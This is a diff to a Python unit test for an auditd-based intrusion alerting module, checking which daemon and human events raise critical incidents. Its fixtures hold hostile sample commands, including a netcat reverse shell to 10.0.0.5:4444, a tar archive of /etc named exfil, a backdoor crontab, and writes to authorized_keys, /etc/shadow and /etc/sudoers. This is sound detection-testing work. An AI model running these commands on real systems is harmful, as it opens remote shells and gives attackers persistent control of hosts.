@@ -873,48 +873,64 @@ class TestAuditdCoverageAndDedup(unittest.TestCase):
         self.assertTrue(any("Application Fatal Error Alert" in t for t in titles))
         self.assertTrue(all(i["severity"] == "critical" for i in incs_15))
 
-    def test_readonly_crontab_list_and_daemon_tar_extract_filters(self):
+    def test_readonly_crontab_list_and_option2_system_daemon_filters(self):
         """
-        Verify:
-        - Read-only `crontab -l` / `crontab -u root -l` produces 0 incidents (daemon or human),
-          while `crontab -e` and `crontab /tmp/backdoor.cron` still fire CRITICAL.
-        - Background daemon (`AUID: 4294967295`) `tar -x -f - --warning=no-timestamp` (dpkg) and `tar -xzf`
-          produce 0 incidents, while `tar -czf` (creation/exfil) and human `tar` still fire CRITICAL.
+        Verify Option 2 system daemon policy + read-only crontab filter:
+        - `crontab -l` / `crontab -u root -l` produces 0 incidents even for humans, while `crontab -e`
+          and `crontab /tmp/backdoor.cron` (human/root SSH `auid=0`) still fire CRITICAL.
+        - Routine `system daemon` (`AUID: 4294967295`) activity (`dpkg` mac-policy, perm_mod, tar,
+          crontab, curl, base64, firewall_change) is muted cleanly (0 incidents).
+        - High-signal RCE/backdoor events under `system daemon` (`4294967295`) — `nc` (`c2_tools`),
+          `/root/.ssh/authorized_keys`, `/etc/shadow`, and `/etc/sudoers` — STILL fire CRITICAL.
         """
         ts = time.time() - 3.0
         cron_l_hex = "crontab\x00-l".encode("utf-8").hex()
         cron_ul_hex = "crontab\x00-u\x00root\x00-l".encode("utf-8").hex()
         tar_dpkg_hex = "tar\x00-x\x00-f\x00-\x00--warning=no-timestamp".encode("utf-8").hex()
-        tar_xzf_hex = "tar\x00-xzf\x00/tmp/pkg.tar.gz".encode("utf-8").hex()
+        b64_hex = "base64\x00-d".encode("utf-8").hex()
+        curl_hex = "curl\x00-s\x00https://example.com".encode("utf-8").hex()
 
         cron_e_hex = "crontab\x00-e".encode("utf-8").hex()
         cron_file_hex = "crontab\x00/tmp/backdoor.cron".encode("utf-8").hex()
         tar_create_hex = "tar\x00-czf\x00/tmp/exfil.tar.gz\x00/etc".encode("utf-8").hex()
+        nc_hex = "nc\x0010.0.0.5\x004444\x00-e\x00/bin/bash".encode("utf-8").hex()
+
+        # Helper invariants remain accurate
+        self.assertTrue(app_module._is_benign_daemon_tar_extract("tar -x -f - --warning=no-timestamp", "4294967295"))
+        self.assertFalse(app_module._is_benign_daemon_tar_extract("tar -czf /tmp/x.tgz /etc", "4294967295"))
 
         with patch.object(app_module, "_is_rule_enabled", return_value=True):
+            # Server 14: benign human `crontab -l` + noisy `system daemon` (4294967295) events -> 0 incidents
             app_module._check_unified_fim(14, {
                 "audit_events": [
-                    {"serial": 9701, "epoch": ts, "key": "scheduled_tasks_cmd", "auid": "4294967295", "username": "root", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts:.3f}:9701): auid=4294967295 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_l_hex}'},
-                    {"serial": 9702, "epoch": ts + 1, "key": "scheduled_tasks_cmd", "auid": "1742601308", "username": "mannan.shariff", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9702): auid=1742601308 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_ul_hex}'},
+                    {"serial": 9701, "epoch": ts, "key": "scheduled_tasks_cmd", "auid": "1742601308", "username": "mannan.shariff", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts:.3f}:9701): auid=1742601308 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_ul_hex}'},
+                    {"serial": 9702, "epoch": ts + 1, "key": "scheduled_tasks_cmd", "auid": "4294967295", "username": "root", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9702): auid=4294967295 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_l_hex}'},
                     {"serial": 9703, "epoch": ts + 2, "key": "archive_staging", "auid": "4294967295", "username": "root", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+2:.3f}:9703): auid=4294967295 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_dpkg_hex}'},
-                    {"serial": 9704, "epoch": ts + 3, "key": "archive_staging", "auid": "4294967295", "username": "root", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+3:.3f}:9704): auid=4294967295 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_xzf_hex}'},
+                    {"serial": 9704, "epoch": ts + 3, "key": "MAC-policy", "auid": "4294967295", "username": "root", "comm": "dpkg", "exe": "/usr/bin/dpkg", "path": "/etc/apparmor.d/usr.bin.test", "line": f'type=SYSCALL msg=audit({ts+3:.3f}:9704): auid=4294967295 comm="dpkg" exe="/usr/bin/dpkg" name="/etc/apparmor.d/usr.bin.test" key="MAC-policy"'},
+                    {"serial": 9705, "epoch": ts + 4, "key": "perm_mod", "auid": "4294967295", "username": "root", "comm": "pulseaudio", "exe": "/usr/bin/pulseaudio", "path": "/run/user/1000/pulse", "line": f'type=SYSCALL msg=audit({ts+4:.3f}:9705): auid=4294967295 comm="pulseaudio" exe="/usr/bin/pulseaudio" name="/run/user/1000/pulse" key="perm_mod"'},
+                    {"serial": 9706, "epoch": ts + 5, "key": "obfuscated_exec", "auid": "4294967295", "username": "root", "comm": "base64", "exe": "/usr/bin/base64", "line": f'type=SYSCALL msg=audit({ts+5:.3f}:9706): auid=4294967295 comm="base64" exe="/usr/bin/base64" key="obfuscated_exec" proctitle={b64_hex}'},
+                    {"serial": 9707, "epoch": ts + 6, "key": "recon_tools", "auid": "4294967295", "username": "root", "comm": "curl", "exe": "/usr/bin/curl", "line": f'type=SYSCALL msg=audit({ts+6:.3f}:9707): auid=4294967295 comm="curl" exe="/usr/bin/curl" key="recon_tools" proctitle={curl_hex}'},
                 ],
                 "file_changes": [],
             })
-            self.assertEqual(len(self._fetch_open_incidents(14)), 0, f"Expected 0 incidents for benign crontab -l / dpkg tar -x, got {self._fetch_open_incidents(14)}")
+            self.assertEqual(len(self._fetch_open_incidents(14)), 0, f"Expected 0 incidents for benign crontab -l / daemon maintenance, got {self._fetch_open_incidents(14)}")
 
+            # Server 15: human actions + root SSH + Option 2 daemon RCE backdoors -> all 7 fire CRITICAL
             app_module._check_unified_fim(15, {
                 "audit_events": [
-                    {"serial": 9711, "epoch": ts, "key": "scheduled_tasks_cmd", "auid": "1742601308", "username": "mannan.shariff", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts:.3f}:9711): auid=1742601308 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_e_hex}'},
-                    {"serial": 9712, "epoch": ts + 1, "key": "scheduled_tasks_cmd", "auid": "4294967295", "username": "root", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9712): auid=4294967295 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_file_hex}'},
-                    {"serial": 9713, "epoch": ts + 2, "key": "archive_staging", "auid": "4294967295", "username": "root", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+2:.3f}:9713): auid=4294967295 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_create_hex}'},
-                    {"serial": 9714, "epoch": ts + 3, "key": "archive_staging", "auid": "1742601308", "username": "mannan.shariff", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+3:.3f}:9714): auid=1742601308 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_dpkg_hex}'},
+                    {"serial": 9711, "epoch": ts, "key": "c2_tools", "auid": "4294967295", "username": "root", "comm": "nc", "exe": "/usr/bin/nc", "line": f'type=SYSCALL msg=audit({ts:.3f}:9711): auid=4294967295 comm="nc" exe="/usr/bin/nc" key="c2_tools" proctitle={nc_hex}'},
+                    {"serial": 9712, "epoch": ts + 1, "key": "ssh_persistence", "auid": "4294967295", "username": "root", "comm": "tee", "exe": "/usr/bin/tee", "path": "/root/.ssh/authorized_keys", "line": f'type=SYSCALL msg=audit({ts+1:.3f}:9712): auid=4294967295 comm="tee" exe="/usr/bin/tee" name="/root/.ssh/authorized_keys" key="ssh_persistence"'},
+                    {"serial": 9713, "epoch": ts + 2, "key": "identity", "auid": "4294967295", "username": "root", "comm": "python3", "exe": "/usr/bin/python3", "path": "/etc/shadow", "line": f'type=SYSCALL msg=audit({ts+2:.3f}:9713): auid=4294967295 comm="python3" exe="/usr/bin/python3" name="/etc/shadow" key="identity"'},
+                    {"serial": 9714, "epoch": ts + 3, "key": "scope", "auid": "4294967295", "username": "root", "comm": "tee", "exe": "/usr/bin/tee", "path": "/etc/sudoers", "line": f'type=SYSCALL msg=audit({ts+3:.3f}:9714): auid=4294967295 comm="tee" exe="/usr/bin/tee" name="/etc/sudoers" key="scope"'},
+                    {"serial": 9715, "epoch": ts + 4, "key": "scheduled_tasks_cmd", "auid": "1742601308", "username": "mannan.shariff", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts+4:.3f}:9715): auid=1742601308 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_e_hex}'},
+                    {"serial": 9716, "epoch": ts + 5, "key": "scheduled_tasks_cmd", "auid": "0", "username": "root", "comm": "crontab", "exe": "/usr/bin/crontab", "line": f'type=SYSCALL msg=audit({ts+5:.3f}:9716): auid=0 comm="crontab" exe="/usr/bin/crontab" key="scheduled_tasks_cmd" proctitle={cron_file_hex}'},
+                    {"serial": 9717, "epoch": ts + 6, "key": "archive_staging", "auid": "1742601308", "username": "mannan.shariff", "comm": "tar", "exe": "/usr/bin/tar", "line": f'type=SYSCALL msg=audit({ts+6:.3f}:9717): auid=1742601308 comm="tar" exe="/usr/bin/tar" key="archive_staging" proctitle={tar_create_hex}'},
                 ],
                 "file_changes": [],
             })
 
         incs_15 = self._fetch_open_incidents(15)
-        self.assertEqual(len(incs_15), 4, f"Expected all 4 genuine cron edit / tar create / human tar incidents, got {incs_15}")
+        self.assertEqual(len(incs_15), 7, f"Expected all 7 RCE backdoor + human + root SSH incidents, got {incs_15}")
         self.assertTrue(all(i["severity"] == "critical" for i in incs_15))
 
 
